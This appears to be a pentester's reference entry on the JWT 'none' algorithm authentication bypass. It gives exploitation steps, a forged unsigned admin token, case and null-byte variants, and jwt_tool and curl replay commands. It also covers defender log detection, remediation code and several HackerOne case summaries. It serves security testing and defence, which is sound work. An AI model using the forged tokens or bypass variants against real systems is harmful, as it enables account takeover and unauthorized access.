# JWT None Algorithm Bypass

**Category:** JWT Vulnerabilities / Authentication Bypass
**Severity:** Critical
**CVSS:** 9.8 (typically)
**Last Updated:** 2026-02-04

## Attack Description

The `none` algorithm bypass exploits JWT implementations that accept unsigned tokens. When a server's JWT library honors `"alg": "none"` in the header, an attacker can forge arbitrary tokens without any cryptographic signing, achieving full authentication bypass.

This is one of the oldest and most well-known JWT attacks, yet it persists in production systems — especially legacy stacks and misconfigured libraries.

## Prerequisites

- Target uses JWT for authentication (session tokens, API auth)
- Server-side JWT library does not explicitly reject `none` algorithm
- No additional server-side session validation (e.g., database lookup)

## Exploitation Steps

### Step 1: Capture a valid JWT
Intercept any authenticated request containing a JWT (Authorization header, cookie, etc.)

### Step 2: Decode the JWT
```bash
# Split by dots and base64-decode
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}
```

### Step 3: Modify the header
Change the algorithm to `none`:
```json
{"alg": "none", "typ": "JWT"}
```

### Step 4: Modify the payload
Change claims to escalate privileges:
```json
{"sub": "admin", "role": "owner", "iat": 1706000000}
```

### Step 5: Forge the token
Base64url-encode header and payload, join with dots, append trailing dot (empty signature):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJvd25lciJ9.
```

### Step 6: Replay
Send the forged token in the original request context.

### Variant: Case-sensitivity bypasses
Some libraries reject `none` but accept:
- `None`, `NONE`, `nOnE`
- `none` with trailing whitespace
- `none\x00` (null byte injection)

## Automated Testing

```bash
# jwt_tool — All-in-one
python3 jwt_tool.py <JWT> -X a  # Tests none + alg confusion

# Manual with curl
curl -H "Authorization: Bearer <forged_token>" https://target.com/api/me
```

## Detection Method

### As a Pentester
1. Intercept JWT from authenticated request
2. Change `alg` to `none` and strip signature
3. If server returns authenticated response → vulnerable
4. Test case variations (`None`, `NONE`, `nOnE`)

### As a Defender (Log Analysis)
- Monitor for JWTs with empty signature segments
- Alert on `alg` header values other than expected algorithm
- Track authentication successes without valid signatures in WAF logs

## Remediation

1. **Whitelist algorithms explicitly** — never rely on the JWT header's `alg` claim
   ```javascript
   jwt.verify(token, secret, { algorithms: ['HS256'] }); // Explicit
   ```
2. **Reject `none` algorithm** at library configuration level
3. **Use well-maintained libraries** — most modern JWT libs reject `none` by default
4. **Server-side validation** — always verify against expected algorithm, never trust client

## Real-World Examples

### 1. Linktree JWT Validation Bypass (HackerOne #1760403)
- **Target:** Linktree backend services
- **Flaw:** Some backend services did not properly validate JWTs; setting expiration to past Unix timestamp achieved bypass
- **Impact:** Full account takeover
- **Severity:** Critical

### 2. Newspack Extended Access Plugin (HackerOne #2536758)
- **Target:** Automattic / Newspack WordPress plugin
- **Flaw:** JWT signing verification completely omitted on registration and login JSON endpoints
- **Impact:** Arbitrary account registration + auth bypass + account hijack
- **Severity:** Critical

### 3. Jitsi-Meet Authentication Bypass (HackerOne #1210502)
- **Target:** 8x8 / Jitsi-Meet
- **Flaw:** Prosody module allowed symmetric algorithms to validate JWTs, enabling arbitrary token sources
- **Impact:** Authorization to protected rooms

### 4. Argo CD JWT Audience Claim (HackerOne #1889161)
- **Target:** Argo CD (all versions from v1.8.2)
- **Flaw:** JWT audience (`aud`) claim not verified, allowing tokens from other OIDC clients
- **Impact:** Cross-service authentication bypass

## Web3 Context

In Web3 platforms, JWTs are commonly used alongside wallet-based auth (SIWE). Common patterns:
- API backend issues JWT after wallet signature verification
- JWT then used for all subsequent API calls (portfolio, trading, settings)
- If JWT validation is weak, attacker can bypass wallet auth entirely by forging API tokens
- **Attack chain:** Forge JWT → access user's portfolio data, modify settings, initiate withdrawals

## References

- PortSwigger Web Security Academy: https://portswigger.net/web-security/jwt
- Intigriti JWT Exploitation Guide (Nov 2025): https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
- HackTricks JWT: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- OWASP Testing Guide - JWT: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
